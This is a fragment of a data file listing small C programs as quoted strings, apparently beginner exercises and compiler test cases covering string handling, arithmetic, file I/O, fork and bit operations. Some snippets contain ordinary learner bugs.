    "#include <stdint.h>\nint main(void) {\n    int8_t i1;\n    uint8_t i2;\n    int16_t i3;\n    uint16_t i4;\n    int32_t i5;\n    uint32_t i6;\n    int64_t i7;\n    uint64_t i8;\n    return 0;\n}",
    "#include <unistd.h>\nvoid ft_putchar(char c)\n{\n    write(1, &c, 1);\n}\nvoid ft_putstr(char *str)\n{\n    while (*str)\n    {\n        ft_putchar(*str);\n        str++;\n    }\n}\nvoid ft_rot13(char *str)\n{\n    while (*str)\n    {\n        if (*str >= 'a' && *str <= 'z')\n            ft_putchar((*str - 'a' + 13) % 26 + 'a');\n        else if (*str >= 'A' && *str <= 'Z')\n            ft_putchar((*str - 'a' + 13) % 26 + 'a');\n        else\n            ft_putchar(*str);\n        str++;\n    }\n}\nint main(int argc, char **argv)\n{\n    if (argc != 2)\n    {\n        ft_putchar('\\n');\n        return (0);\n    }\n    ft_rot13(argv[1]);\n    ft_putchar('\\n');\n    return (0);\n}",
    "int main(void) {\n    const int segments[10][7] = {{1, 1, 1, 1, 1, 1, 0 },\n                                 {0, 1, 1, 0, 0, 0, 0 },\n                                 {1, 1, 0, 1, 1, 0, 1 },\n                                 {1, 1, 1, 1, 0, 0, 1 },\n                                 {0, 1, 1, 0, 0, 1, 1 },\n                                 {1, 0, 1, 1, 0, 1, 1 },\n                                 {1, 0, 1, 1, 1, 1, 1 },\n                                 {1, 1, 1, 0, 0, 0, 0 },\n                                 {1, 1, 1, 1, 1, 1, 1 },\n                                 {1, 1, 1, 1, 0, 1, 1 }};\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n char password[50];\n printf(\"Enter a word: \");\n scanf(\"%s\",password);\n for (int i = 0; i < strlen(password);i++){\n  if(password[i] == 'e'){\n   password[i] = '3';\n  }\n  if(password[i] == 'l'){\n    password[i] = '1';\n                }\n  if(password[i] == 'a'){\n                        password[i] = '@';\n                }\n }\n printf(\"Your bad password is %s\\n\",password);\n   return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int n;\n    printf(\"Bem vindo a funcao vetorial!\\n\");\n    printf(\"Aparentemente os matematicos estavam com preguica de calcular as fatoriais dos numeros\\n\");\n    printf(\"Ou simplesmente de usarem a calculadora cientifica mesmo...\\n\");\n    printf(\"Por favor diga o numero que voce deseja descobrir a fatorial\\n\");\n    scanf(\"%i\",&n);\n    for (int a = n; a > 0; a--) {\n        int fatorial = 1;\n        printf(\"%i! = \", a);\n        for (int i = a; i > 0; i--) {\n            if (i != 1)\n                printf(\"%i . \",i);\n            else\n                printf(\"%i\",i);\n            fatorial *= i;\n        }\n        printf(\" = %i \\n\", fatorial);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid l31()\n{\n    int nr;\n    scanf(\"%d\", &nr);\n    if(nr & 1)\n        printf(\"impar\");\n    else\n        printf(\"par\");\n}\nvoid l32()\n{\n    int nr;\n    printf(\"nr=\");\n    scanf(\"%d\", &nr);\n    printf(\"nr*8: %d, nr/4: %d, nr*10: %d\\n\", nr << 3, nr >> 2, (nr << 1) + (nr << 3));\n}\nint main()\n{\n    l32();\n    return 0;\n}",
    "#include <stdio.h>\n\nint main() {\n  int fib0 = 1;\n  int fib1 = 2;\n  int sum = 0;\n  while(fib1 < 4000000) {\n    if(fib1 %2 == 0) { sum += fib1; }\n    int t = fib0;\n    fib0 = fib1;\n    fib1 += t;\n  }\n  printf(\"Sum of even fib numbers < %d = %d\", 4000000, sum);\n}",
    "#include <stdio.h>\nint main() {\n  long nc = 0;\n  while (getchar() != (-1)) {\n    ++nc;\n  }\n  printf(\"A total of %ld characters.\\n\", nc);\n  return 1;\n}",
    "#include <stdio.h>\nint main() {\n    FILE *fp = fopen(\"data.txt\", \"r\");\n    char c = 0;\n    while ((c = getc(fp)) != (-1)) {\n        printf(\"%c\", c);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n float x;\n for(x=4;x<200;x++)\n if(x/6+x/12+x/7+5+x/2+4==x)\n {\n  printf(\"age=%.0f\\n\",x);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int num;\n    float f;\n    printf(\"Enter an integer: \");\n    scanf(\"%d\", &num);\n    printf(\"Entar a floating point number: \");\n    scanf(\" %f\", &f);\n    printf(\"%d \", num);\n    printf(\"%lf\", f);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n int32_t a = 0xFEDCBA98 << 32;\n int32_t b = 0xFEDCBA98 >> 36;\n unsigned c = 0xFEDCBA98u >> 40 ;\n printf(\"%0#x\\n\", a);\n printf(\"%0#x\\n\", b);\n printf(\"%0#x\\n\", c);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int n,i;\n    float X,Y,s;\n    scanf(\"%d\", &n);\n    for (i=0;i<n; i++)\n    {\n        scanf(\"%f%f\", &X, &Y);\n        if (Y==0)\n        {\n            printf(\"divisao impossivel\\n\");\n        }\n        else\n        {\n            s=X/Y;\n            printf(\"%.1f\\n\", s);\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  printf(\"Arreglos unidimensionales.\\n\\n\");\n  int listaEnteros[3];\n  listaEnteros[0] = 4;\n  listaEnteros[1] = 5;\n  listaEnteros[2] = 6;\n  float listaFlotantes[] = {23.4, 34.5, 45.6, 45.6, 56.7};\n  char listaCaracteres[4];\n  listaCaracteres[0] = 'D';\n  listaCaracteres[1] = 'a';\n  listaCaracteres[2] = 'n';\n  listaCaracteres[3] = 'i';\n  printf(\"\\nPrimer entero: \\t\\t %d\", listaEnteros[0]);\n  printf(\"\\nUltimo flotante: \\t %f\", listaFlotantes[4]);\n  printf(\"\\nLista de caracteres: \\t %c%c%c%c. \\n\", listaCaracteres[0],\n         listaCaracteres[1], listaCaracteres[2], listaCaracteres[3]);\n  printf(\"\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char letra;\n    printf(\"\\nEntre com uma letra qualquer:\");\n    letra = getchar();\n    if(letra>=65 && letra<=90)\n    {\n            printf(\"\\nEsta letra eh MAIUSCULA\\n\");\n    }\n    else if(letra>=97 && letra<=122)\n    {\n        printf(\"\\n Esta letra eh minuscula\\n\");\n    }\n    else\n    {\n        printf(\"\\nProvavelmente voce digitou um simbolo\");\n    }\n    return 0;\n}",
    "\n\n\n\nint main (int argc, char *argv[]) {\n    __attribute__((vector_size((4)*sizeof(unsigned int)))) unsigned int vuint = { 1, 2, 3, 4};\n    __attribute__((vector_size((4)*sizeof(int)))) int vint0 = { 1, 1, 1, 1};\n    __attribute__((vector_size((4)*sizeof(int)))) int vint1 = {-1, -1, -1, -1};\n    __attribute__((vector_size((4)*sizeof(int)))) int i1, i2, i3;\n    __attribute__((vector_size((4)*sizeof(unsigned int)))) unsigned int u1, u2, u3;\n    i1 = vint1<< vint0;\n    if ((*((int *) &(i1) + 0)) != ((int)-1 << (int)1))\n        __builtin_abort ();\n    if ((*((int *) &(i1) + 1)) != ((int)-1 << (int)1))\n        __builtin_abort ();\n    if ((*((int *) &(i1) + 2)) != ((int)-1 << (int)1))\n        __builtin_abort ();\n    if ((*((int *) &(i1) + 3)) != ((int)-1 << (int)1))\n        __builtin_abort ();\n    u1 = vuint << vint0;\n    if ((*((int *) &(u1) + 0)) != ((unsigned int)1 << (int)1))\n        __builtin_abort ();\n    if ((*((int *) &(u1) + 1)) != ((unsigned int)2 << (int)1))\n        __builtin_abort ();\n    if ((*((int *) &(u1) + 2)) != ((unsigned int)3 << (int)1))\n        __builtin_abort ();\n    if ((*((int *) &(u1) + 3)) != ((unsigned int)4 << (int)1))\n        __builtin_abort ();\n    i2 = vint1 >> vuint;\n    if ((*((int *) &(i2) + 0)) != ((int)-1 >> (unsigned int)1))\n        __builtin_abort ();\n    if ((*((int *) &(i2) + 1)) != ((int)-1 >> (unsigned int)2))\n        __builtin_abort ();\n    if ((*((int *) &(i2) + 2)) != ((int)-1 >> (unsigned int)3))\n        __builtin_abort ();\n    if ((*((int *) &(i2) + 3)) != ((int)-1 >> (unsigned int)4))\n        __builtin_abort ();\n    vint1 >>= vuint;\n    vuint <<= vint0;\n    vuint <<= vint1;\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid check_intInput(int *a, int *b, int *c);\nint convert_nth_position(int number, int position);\nint nth_position(int num, int position);\nint main()\n{\n    printf(\"Enter decimal, bit position and bit value: \");\n    int n, position, v;\n    check_intInput(&n, &position, &v);\n    int valueBit = nth_position(n, position);\n    if (valueBit == v)\n    {\n        printf(\"%d\", n);\n    }\n    else\n    {\n        printf(\"converted bit value %d \",\n               convert_nth_position(n, position));\n    }\n    return (0);\n}\nint nth_position(int num, int position)\n{\n    return ((num >> position) & 1);\n}\nint convert_nth_position(int number, int position)\n{\n    return (number ^ (1 << position));\n}\nvoid check_intInput(int *a, int *b, int *c)\n{\n    if ((scanf(\"%d %d %d%*c\", a, b, c)) != 3)\n    {\n        printf(\"Not digit!\");\n        exit(1);\n    }\n    if (*a < 0 || *b < 0 || *c < 0)\n    {\n        printf(\"Can't be negative!\");\n        exit(1);\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n char chaine[1000] = \"\";\n FILE* fichier = ((void*)0);\n FILE* fichier2 = ((void*)0);\n    fichier = fopen(\"exemple.txt\", \"r+\");\n    if (fichier != ((void*)0))\n    {\n     fgets(chaine, 1000, fichier);\n  fichier2 = fopen(\"copie.txt\", \"w\");\n  fputs(chaine, fichier2);\n        fclose(fichier);\n  fclose(fichier2);\n    }\n    else\n    {\n        printf(\"Impossible d'ouvrir le fichier exemple.txt\");\n  return 0;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int zippo[4][3] = {\n        {1, 2, 12},\n        {3, 4, 34},\n        {5, 6, 56},\n        {7, 8, 78}\n    };\n    int (*pz)[3];\n    pz = zippo;\n    printf(\"p[0][1] = %d\\n\", pz[0][1]);\n    printf(\"p[0][1] = %d\\n\", *(*pz + 1));\n    printf(\"p[1][2] = %d\\n\", pz[1][2]);\n    printf(\"p[1][2] = %d\\n\", *(*(pz + 1) + 2));\n    printf(\"\\n---------------------------------------------\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n\n    int numero, cont, ePrimo;\n\n    cont = 2;\n\n    ePrimo = 1;\n\n    scanf(\"%d\", &numero);\n    while(cont < numero && ePrimo){\n\n        if ((numero % cont) == 0) {\n\n            ePrimo = -1;\n\n        }\n\n        cont++;\n\n    }\n\n    if (numero == 1) {\n\n        ePrimo = -1;\n\n    }\n\n    if (ePrimo == 1){\n\n        printf(\"sim\");\n\n    } else {\n\n        printf(\"nao\");\n\n    }\n\n    return 0;\n\n}",
    "\n\nint main()\n{\n  char array[16*1024];\n  register int loop;\n  register int solution = 0;\n  for (loop = 0; loop < 1000000; loop++)\n    {\n        solution += array[0]+array[8202];\n    }\n  return solution;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main()\n{\n    char a[5];\n    scanf(\"%s\", a);\n    printf(\"%s\", a);\n}",
    "#include <stdio.h>\n#include <math.h>\nvoid replaceDigit(int *ptr, int replace, int replacement);\nint main()\n{\n int number;\n int replace;\n int replacement;\n printf(\"Enter an integer: \");\n scanf(\"%d\", &number);\n printf(\"Enter the digit to replace: \");\n scanf(\"%d\", &replace);\n printf(\"Enter the replacement digit: \");\n scanf(\"%d\", &replacement);\n replaceDigit(&number, replace, replacement);\n printf(\"New number is: %d\", number);\n return 0;\n}\nvoid replaceDigit(int *ptr, int replace, int replacement)\n{\n int temp = *ptr;\n int lost = 0;\n int counter = 0;\n int i;\n int multiple = 1;\n while (temp > 0)\n {\n  for(i = 0; i < counter; i++){\n   multiple *= 10;\n  }\n  if (temp % 10 == replace){\n   temp = temp - replace + replacement;\n   temp *= pow(10, counter);\n   temp += lost;\n   break;\n  }\n  lost += temp % 10 * multiple;\n  temp /= 10;\n  counter++;\n  multiple = 1;\n }\n *ptr = temp;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid foo (char *aop[]) {\n    printf(\"foo\\n\");\n}\nvoid bar (char *aop[4]) {\n    printf(\"bar\\n\");\n}\nvoid hoo (char (*pta)[]) {\n    printf(\"hoo\\n\");\n}\nvoid wow (char (*pta)[4]) {\n    printf(\"wow\\n\");\n}\nint main (int argc, char *argv[]) {\n    char a='a', b='b', c='c', d='d';\n    char array[4] = {'e', 'f', 'g', 'h'};\n    char *pointer = array;\n    char **double_pointer;\n    char *array_of_pointer[4];\n    char (*pointer_to_array)[4];\n    char (*pointer_to_nosize_array)[];\n    array_of_pointer[0] = &a;\n    array_of_pointer[1] = &b;\n    array_of_pointer[2] = &c;\n    array_of_pointer[3] = &d;\n    pointer_to_array = &array;\n    foo(double_pointer);\n    foo(array_of_pointer);\n    bar(double_pointer);\n    bar(array_of_pointer);\n    hoo(pointer_to_array);\n    hoo(pointer_to_nosize_array);\n    wow(pointer_to_array);\n    wow(pointer_to_nosize_array);\n    pointer += 2;\n    pointer_to_array += 2;\n    return 0;\n}",
    "#include<stdio.h>\n#include<locale.h>\nint main() {\n setlocale(6, \"\");\n float hr, inss, num, salbruto, saliquido;\n printf(\"Valor hora aula: \");\n scanf(\"%f\", &hr);\n printf(\"Numero de aulas mes: \");\n scanf(\"%f\", &num);\n printf(\"desconto INSS: \");\n scanf(\"%f\", &inss);\n salbruto = hr * num;\n saliquido = salbruto - salbruto*(inss/100);\n printf(\"Salario bruto: %.2f\\n\", salbruto);\n printf(\"Salario liquido: %.2f\\n\", saliquido);\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n#include <errno.h>\nint main(int argc, char *argv[])\n{\n    if (argc != 3)\n    {\n        fprintf((stderr), \"Usage: %s [target] \"\n            \"[new-name]\\n\", argv[0]);\n        return 1;\n    }\n    if (link(argv[1], argv[2]) == -1)\n    {\n        perror(\"Can't create link\");\n        return 1;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\n\nint DivideConquer(int data[], int left, int right) {\n  int mid;\n  int leftMaxSum, rightMaxSum;\n  int leftBoardSum, rightBoardSum;\n  int leftMaxBoardSum, rightMaxBoardSum;\n  if (left == right) return data[left];\n  mid = (left + right) / 2;\n  leftMaxSum = DivideConquer(data, left, mid);\n  rightMaxSum = DivideConquer(data, mid + 1, right);\n  leftMaxBoardSum = data[mid];\n  leftBoardSum = 0;\n  for (int i = mid; i >= left; i--) {\n    leftBoardSum += data[i];\n    if (leftBoardSum > leftMaxBoardSum) leftMaxBoardSum = leftBoardSum;\n  }\n  rightMaxBoardSum = data[mid + 1];\n  rightBoardSum = 0;\n  for (int i = mid + 1; i <= right; i++) {\n    rightBoardSum += data[i];\n    if (rightBoardSum > rightMaxBoardSum) rightMaxBoardSum = rightBoardSum;\n  }\n  return ((((leftMaxSum > rightMaxSum) ? (leftMaxSum) : (rightMaxSum)) > leftMaxBoardSum + rightMaxBoardSum) ? (((leftMaxSum > rightMaxSum) ? (leftMaxSum) : (rightMaxSum))) : (leftMaxBoardSum + rightMaxBoardSum));\n}\nint n, a[(200000 + 7)];\nint main() {\n  scanf(\"%d\", &n);\n  for (int i = 0; i < n; i++) {\n    scanf(\"%d\", &a[i]);\n  }\n  printf(\"%d\\n\", DivideConquer(a, 0, n - 1));\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n printf(\"F*cking new repo for fun :))\");\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int PageViews = 0;\n    PageViews = PageViews + 1;\n    printf(\"page views %d \\n\", PageViews);\n    PageViews = PageViews + 1;\n    printf(\"page views %d \\n\", PageViews);\n    PageViews = PageViews + 1;\n    printf(\"page views %d \\n\", PageViews);\n    float balance = 1000.00;\n    balance *= 1.1;\n    printf(\"balance %f \\n\", balance);\n    balance *= 1.1;\n    printf(\"balance %f \\n\", balance);\n    balance *= 1.1;\n    printf(\"balance %f \\n\", balance);\n    return 0;\n}",
    "#include <stdio.h>\nvoid order(int arr[], int n);\nint main()\n{\n    int n, i, arr[1001], j, temp, pos;\n    scanf(\"%d\", &n);\n    for(i=0; i<n; i++)\n        scanf(\"%d\", &arr[i]);\n    temp = arr[n-1];\n    for(i=n-2; i>=0; i--){\n        if(arr[i]>temp){\n            arr[i+1] = arr[i];\n        for(j=0; j<n; j++)\n        printf(\"%d \", arr[j]);\n        printf(\"\\n\");\n        pos = i;\n        }\n    }\n    arr[pos] = temp;\n    for(i=0; i<n; i++)\n        printf(\"%d \", arr[i]);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[])\n{\n  int numbers[4] = { 0 };\n  char name[4] = { 'a' };\n  printf(\"numbers: %d %d %d %d\\n\", numbers[0], numbers[1], numbers[2], numbers[3]);\n  printf(\"name each: %c %c %c %c\\n\", name[0], name[1], name[2], name[3]);\n  printf(\"name: %s\\n\", name);\n  numbers[0] = 1;\n  numbers[1] = 2;\n  numbers[2] = 3;\n  numbers[3] = 4;\n  name[0] = 'Z';\n  name[1] = 'e';\n  name[2] = 'd';\n  name[3] = '\\0';\n  printf(\"numbers: %d %d %d %d\\n\", numbers[0], numbers[1], numbers[2], numbers[3]);\n  printf(\"name each: %c %c %c %c\\n\", name[0], name[1], name[2], name[3]);\n  printf(\"name: %s\\n\", name);\n  char* another = \"Zed\";\n  printf(\"another: %s\\n\", another);\n  printf(\"another each: %c %c %c %c\\n\", another[0], another[1], another[2], another[3]);\n  return 0;\n}",
    "#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(int argc, char *argv[])\n{\n FILE *inputFile = fopen(\"Prob15.in.txt\", \"r\");\n int testCases;\n fscanf(inputFile, \"%d\\n\", &testCases);\n char string[1024];\n int stringLength = 0;\n while(testCases > 0){\n  fgets(string, 1024, inputFile);\n  stringLength = strlen(string) - 1;\n  for(int i = 0; i < stringLength; i++){\n   char letter = string[i];\n   letter = letter - 64;\n   int originalValue = letter;\n   if(letter <= 5){\n    letter = letter + 6;\n   }\n   else if(letter <= 10){\n    letter = letter * letter;\n   }\n   else if(letter <= 15){\n    letter = ((letter % 3) * 5) + 1;\n   }\n   else if(letter <= 20){\n    int sum = (letter / 10) + (letter % 10);\n    letter = sum * 8;\n   }\n   else{\n    int bigFactor = 0;\n    for(int factor = letter / 2; factor > 0; factor--){\n     if(letter % factor == 0){\n      bigFactor = factor;\n      break;\n     }\n    }\n    letter = bigFactor * 2;\n   }\n   while(letter > 26){\n    letter = letter - 26;\n   }\n   if(letter == 0){\n    letter = originalValue;\n   }\n   letter = letter + 64;\n   printf(\"%c\", letter);\n  }\n  printf(\"\\n\");\n  testCases = testCases - 1;\n }\n fclose(inputFile);\n}",
    "#include <stdio.h>\nint main(void)\n{\n    fprintf((stdout), \"%d %c %s\\n\", 100, 'c', \"this is a string\");\n    printf(\"%d %c %s\\n\", 100, 'c', \"this is a string\");\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n, i;\n    printf(\"Enter n: \");\n    scanf(\"%d\", &n);\n    for(i = 1; i <= n; i++)\n    {\n        if(i % 3 == 0 || i % 7 == 0)\n        {\n            continue;\n        }\n        if(i == n)\n        {\n            printf(\"%d\\n\", i);\n            break;\n        }\n        printf(\"%d \", i);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint func(void)\n{\n    static int counter = 1;\n    return ++counter;\n}\nint main() {\n    int answer;\n    answer = func() - func() * func();\n    printf(\"%d\\n\", answer);\n    return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main()\n{ int n,m;\n int i;\n int j=0,a[10000];\n int flag=0;\n  for(n=2;n<=100000;n++)\n     {flag=0;\n for(i=2;i<=sqrt(n);i++)\n        {\n            if(n%i==0)\n        {flag=1;\n       break;}\n       }\n      if(flag==0)\n       {\n           a[j]=n;\n           j++;\n       }\n        }\nscanf(\"%d\",&m);\nif (m!=99991){\n   for (j=0;j<9592;j++)\n   { if(a[j]==m)\n        printf(\"%d \",a[j+1]);\n   }}\n   else\n    printf (\"100003\");\n          return 0;}",
    "#include<stdio.h>\nint main()\n{\n    int x,y,i,n, z,sum=0;\n    scanf(\"%d%d\", &x, &y);\n    if(x>y)\n    {\n        z=y; y=x; x=z;\n    }\n    if(x%2==0)\n    {\n        x++;\n        n=x;\n    }\n    else\n    {\n        n=x+2;\n    }\n    for(i=n;i<y; i=i+2)\n    {\n        sum=sum+i;\n    }\n    printf(\"%d\\n\", sum);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int i = 0, j = 2, k = 1;\n  while(k<=10) {\n    j--;\n    i += j;\n    k++;\n  }\n  printf(\"i=%d, j=%d, k=%d\\n\", i, j, k);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main()\n{\n pid_t pid;\n pid = fork();\n if(pid > 0)\n {\n  printf(\"\\nI am parent. Fork() = %d, process_id = %d, parent_id = %d\\n\", pid, getpid(), getppid());\n }\n else if(pid == 0)\n {\n         printf(\"\\nI am child. Fork() = %d, process_id = %d, parent_id = %d\\n\", pid, getpid(), getppid());\n  sleep(10);\n  printf(\"\\nI am child. Fork() = %d, process_id = %d, parent_id = %d\\n\", pid, getpid(), getppid());\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void) {\n    FILE *fin = fopen(\"beads.in\", \"r\");\n    FILE *fout = fopen(\"beads.out\", \"w\");\n    int n, attempt, best, i, j, changed;\n    char color;\n    char necklace[800];\n    fscanf(fin, \"%d\", &n);\n    fscanf(fin, \"%s\", necklace);\n    strncpy(&necklace[n], necklace, n);\n    best = 0;\n    for (i = 0; i < n; ++i) {\n      attempt = 0;\n      color = 0;\n      changed = 0;\n      for (j = 0; j < n; ++j) {\n        if (necklace[i+j] == 'w') {\n          attempt += 1;\n        }\n        else if (necklace[i+j] == 'r' || necklace[i+j] == 'b') {\n          if (color == 0) {\n            color = necklace[i+j];\n          }\n          if (color == necklace[i+j]) {\n            attempt += 1;\n          } else {\n            if (changed) {\n              break;\n            } else {\n              changed = 1;\n              color = necklace[i+j];\n              attempt += 1;\n            }\n          }\n        }\n      }\n      if (attempt > best) {\n        best = attempt;\n      }\n    }\n    fprintf(fout, \"%d\\n\", best);\n    exit(0);\n}",
    "extern void abort(void);\nvoid DisplayNumber (unsigned long v)\n{\n  if (v != 0x9aL)\n    abort();\n}\nunsigned long ReadNumber (void)\n{\n  return 0x009a0000L;\n}\nint main (void)\n{\n  unsigned long tmp;\n  tmp = (ReadNumber() & 0x00ff0000L) >> 16;\n  DisplayNumber (tmp);\n  return 0;\n}",
    "char *p;\nchar *q;\nchar swap() {\n    char * c = p;\n    p = q;\n    q = c;\n}\nvoid recursion(unsigned i) {\n    if (i == 0) {\n        return;\n    }\n    swap();\n    recursion(i--);\n}\nint main () {\n    char a[10];\n    char b[10];\n    p = a;\n    q = b;\n    recursion(10);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\n\n\nunsigned char PIX_WHITE=0x01;\nint main(int argc,char **argv){\n FILE *fp;\n int i,x,y;\n unsigned char data[128 +1];\n unsigned char out[128/64*8][8];\n unsigned char c;\n if( argc>2 && argv[1][0] == '-'){\n  PIX_WHITE=(unsigned char)atoi( &argv[1][1] );\n  printf(\"PIX_WHITE = %02x\\n\",PIX_WHITE);\n  argv++;\n }\n fp=fopen(argv[1],\"r\");\n if(fp==0){\n  fprintf((stderr),\"Usage : %s [-1 or -0] filename.bmp\\n\",argv[0]);\n  fprintf((stderr),\"\u30aa\u30d7\u30b7\u30e7\u30f3 -0 \u3067\u767d\u9ed2\u53cd\u8ee2\u3057\u307e\u3059\\n\");\n  return -1;\n }\n fseek(fp,0x0000003E,(0));\n fgets((char *)data,128 +1,fp);\n fclose(fp);\n for(y=0;y<128/64*8;y++){\n  for(x=0;x<64/8;x++){\n   printf(\"%02x \",data[x+(128 -8)-y*(64/8)]);\n  }\n  printf(\"\\n\");\n }\n memset(out,0x00,128/64*8*8);\n for(y=0;y<128/64*8;y++){\n  for(x=0;x<64;x++){\n   c=data[x/8+(128 -8)-y*(64/8)];\n   if(x%8==0){\n    out[x/8+(y/8)*8][y%8]=c;\n   }\n   if( (( c>>(7-(x%8)) ) & 0x01) == PIX_WHITE ){\n    printf(\"#\");\n   }else{\n    printf(\" \");\n   }\n  }\n  printf(\"\\n\");\n }\n for(i=0;i<128/64*8;i++){\n  printf(\"poke#%3X,\",0x700 +i*8);\n  for(y=0;y<8;y++){\n   if(PIX_WHITE) c = out[i][y]; else c = ~out[i][y];\n   if(c<100) printf(\"%d\",c);\n   else printf(\"#%X\",c);\n   if(y<7)printf(\",\");\n  }\n  printf(\"\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int A, B, S;\n    int i = 1;\n    while (i <= 3)\n    {\n        printf(\"\\n\\nInforme o valor de A: \");\n        scanf(\"%d\",&A);\n        printf(\"\\n\\nInforme o valor de B: \");\n        scanf(\"%d\",&B);\n        S =A + B;\n        printf(\"\\nResultado: %d\",S);\n        i++;\n    }\n}",
    "int main() {\n  if (1 == 2) {\n    main();\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{ int nombre;\n printf(\"Entrez le nombre \u00e0 multiplier: \");scanf(\"%d\",&nombre);\n for (int i = 1; i <= 9; ++i)\n {\n  int resultat=i*nombre;\n  printf(\"%d * %d = %2d\\n\",nombre,i,resultat );\n }\n return 0;\n}",
    "#include <ctype.h>\n#include <stdio.h>\nvoid strip_extra_spaces(char* str) {\n  int i, x;\n  for(i=x=0; str[i]; ++i)\n    if(!__isspace(str[i]) || (i > 0 && !__isspace(str[i-1])))\n      str[x++] = str[i];\n  str[x] = '\\0';\n}\nint main(int argc, char* argv[]) {\n  char str[] = \"  If  you  gaze   into  the abyss,    the   abyss gazes also   into you.    \";\n  strip_extra_spaces(str);\n  printf(\"%s\\n\",str);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int index = 1;\n    while (index <= 5) {\n        printf(\"while %d\\n\", index);\n        index++;\n    }\n    int j = 6;\n    do {\n        printf(\"do %d\\n\", j);\n        j++;\n    } while (j <= 5);\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <ctype.h>\nstatic\nvoid perror_exit(const char *msg)\n{\n perror(msg);\n exit(1);\n}\nchar *joinpath(const char *dir, const char *file)\n{\n char *out;\n if (file[0] == '/')\n {\n  out = strdup(file);\n  if (!out)\n   perror_exit(\"strdup\");\n  return out;\n } else {\n  size_t len1, len2;\n  len1 = strlen(dir);\n  len2 = strlen(file);\n  out = malloc(len1 + 1 + len2 + 1);\n  if (!out)\n   perror_exit(\"strdup\");\n  memcpy(out, dir, len1);\n  out[len1] = '/';\n  memcpy(out + len1 + 1, file, len2 + 1);\n }\n return out;\n}\nvoid do_header(const char *dir, const char *file)\n{\n FILE *in;\n char *path;\n char *line = 0;\n size_t len = 0;\n ssize_t read;\n path = joinpath(dir, file);\n in = fopen(path, \"r\");\n if (!in)\n  perror_exit(\"fopen(input file)\");\n while ((read = getline(&line, &len, in)) != -1) {\n  if (memcmp(line, \"@include \", 9) == 0) {\n   const char *file;\n   line[read - 1] = '\\0';\n   file = line + 9;\n   while (__isspace(file[0]))\n    file++;\n   do_header(dir, file);\n  } else\n   fputs(line, (stdout));\n }\n free(line);\n fclose(in);\n free(path);\n}\nstatic\nvoid usage(const char *pname)\n{\n fprintf((stderr), \"usage: %s <include dir> infile outfile\\n\", pname);\n exit(1);\n}\nint main(int argc, const char *argv[])\n{\n const char *dir;\n FILE *out;\n if (argc != 4)\n  usage(argv[0]);\n dir = argv[1];\n out = freopen(argv[3], \"w\", (stdout));\n if (!out)\n  perror_exit(\"fopen(outfile) failed\");\n do_header(dir, argv[2]);\n return 0;\n}",
    "#include<stdio.h>\n\nint main(void){\n  char cadeia[101];\n  int i=0;\n  while(i!=1){\n    fgets(cadeia, 101, (stdin));\n    if(cadeia[0] != '\\n'){\n      fputs(cadeia, (stdout));\n    }else{\n      i=1;\n    }\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    char x[5] = \"-143\";\n    printf(\"%s\\n\", x);\n    int y = atoi(x);\n    y++;\n    printf(\"%d\\n\", y);\n}",
    "int main()\n{\n    return 0;\n}\nstatic char daytab[2][13] = {\n    {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31},\n    {0, 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}\n};\nint day_of_year(int year, int month, int day)\n{\n    int leap;\n    char *p;\n    leap = (year % 4 == 0 && year % 100 != 0) || year % 400 == 0;\n    p = daytab[leap];\n    while (--month)\n    {\n        day += *++p;\n    }\n    return day;\n}\nvoid month_day(int year, int yearday, int *pmonth, int *pday)\n{\n    int leap;\n    char *p;\n    leap = (year % 4 == 0 && year % 100 != 0) || year % 400 == 0;\n    p = daytab[leap];\n    while (yearday > *++p)\n    {\n        yearday -= *p;\n    }\n    *pmonth = p - *(daytab + leap);\n    *pday = yearday;\n}",
    "#include <stdio.h>\nint main() {\n    double r, pi=3.14159;\n    scanf(\"%lf\", &r);\n    printf(\"VOLUME = %.3lf\\n\", (4.0/3)*pi*r*r*r);\n    return 0;\n}",
